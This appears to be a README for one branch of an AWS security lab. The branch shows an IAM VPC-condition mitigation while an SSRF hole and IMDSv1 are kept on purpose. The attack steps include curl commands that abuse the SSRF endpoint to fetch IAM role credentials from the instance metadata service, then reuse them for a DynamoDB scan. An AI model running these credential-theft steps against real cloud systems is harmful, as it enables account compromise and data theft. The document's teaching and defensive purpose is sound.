# IMDSv1 Security Lab - Branch: vpc-conditional

## Overview
This branch demonstrates **PARTIAL MITIGATION** using VPC conditions in IAM policies. While credentials can still be stolen via SSRF, they can only be used from within the VPC.

⚠️ **PARTIALLY VULNERABLE**: Credentials can still be stolen but have limited usability outside the VPC.

## Current Security Posture (PARTIAL MITIGATION)
- ✗ IMDSv1 still enabled (credentials can be stolen)
- ✗ SSRF vulnerability still exists
- ✅ **NEW: VPC condition on IAM policy** (credentials only work from VPC)
- ✅ **NEW: Resource-specific permissions** (not wildcard)
- ✗ DynamoDB still accessible via internet (not using VPC endpoint)

## What Changed from Branch 1
```diff
IAM Policy Improvements:
+ Added VPC condition: "aws:SourceVpc": "vpc-xxx"
+ Changed resource from "*" to specific DynamoDB table ARN
```

## Lab Architecture
```
Internet 
    |
    ├── Bastion Host (Public Subnet)
    │   ├── Attack Tools
    │   └── ❌ Stolen creds DON'T work from here (outside VPC)
    |
    └── Web Server (Public Subnet) 
        ├── Still Vulnerable to SSRF
        ├── ✅ Creds work from here (inside VPC)
        └── IAM Role with VPC-restricted DynamoDB Access
```

## Attack Scenario

### Prerequisites
Same as Branch 1 - deploy infrastructure with Terraform.

### Attack Demonstration

#### Step 1: Credentials Can Still Be Stolen
```bash
# Connect to bastion
ssh -i imdsv1-lab.pem ec2-user@<BASTION_PUBLIC_IP>

# SSRF still works to steal credentials
curl "http://<WEB_SERVER_PRIVATE_IP>:8080/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# Get full credentials
ROLE_NAME=imdsv1-lab-web-server-role
curl "http://<WEB_SERVER_PRIVATE_IP>:8080/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME"
```

#### Step 2: But Credentials Don't Work Outside VPC
```bash
# Run the attack script
./steal-creds.sh http://<WEB_SERVER_PRIVATE_IP>:8080

# Output will show:
# ✅ Credentials successfully stolen
# ❌ Access DENIED when trying to use them from bastion
# Error: "Request must originate from the specified VPC"
```

#### Step 3: Credentials WOULD Work Inside VPC
If an attacker compromised another instance within the VPC, the stolen credentials would still work:

```bash
# From web server itself (or any instance in the VPC)
export AWS_ACCESS_KEY_ID=<stolen_key>
export AWS_SECRET_ACCESS_KEY=<stolen_secret>
export AWS_SESSION_TOKEN=<stolen_token>

# This WOULD work from within VPC
aws dynamodb scan --table-name Products --region us-east-1
```

## Why This Partial Mitigation Works
1. **VPC Condition**: IAM policy includes `"aws:SourceVpc"` condition
2. **Network Boundary**: AWS enforces that API calls must originate from specified VPC
3. **Defense in Depth**: Even if credentials are stolen, usage is geographically limited

## Remaining Vulnerabilities
1. **IMDSv1 Still Active**: Credentials can still be stolen via SSRF
2. **SSRF Not Fixed**: Application still vulnerable to SSRF attacks
3. **Lateral Movement**: Attacker with VPC access can still use credentials
4. **No VPC Endpoint**: DynamoDB traffic still goes over internet

## Security Improvements in This Branch
✅ **VPC Condition**: Limits credential usage to VPC  
✅ **Resource-Specific Permissions**: No more wildcard resources  
✅ **Network Segmentation**: Creates a network boundary for credential usage

## Testing the Mitigation
```bash
# Test 1: From Outside VPC (Fails)
aws dynamodb scan --table-name Products \
  --region us-east-1 \
  --endpoint-url https://dynamodb.us-east-1.amazonaws.com
# Result: Access Denied

# Test 2: Legitimate Access Still Works
curl http://<WEB_SERVER_PUBLIC_IP>:8080/api/products
# Result: Successfully returns products (works from within VPC)
```

## Next Steps
Check out `branch-3-vpc-endpoint` for the most secure configuration:
- Implements VPC endpoint for DynamoDB
- Restricts DynamoDB access to VPC endpoint only
- Adds IMDSv2 enforcement
- Implements SSRF protection

## Key Takeaways
- VPC conditions provide network-based access control
- This is defense in depth - not a complete solution
- Credentials can still be stolen but have limited blast radius
- Must be combined with other controls for full protection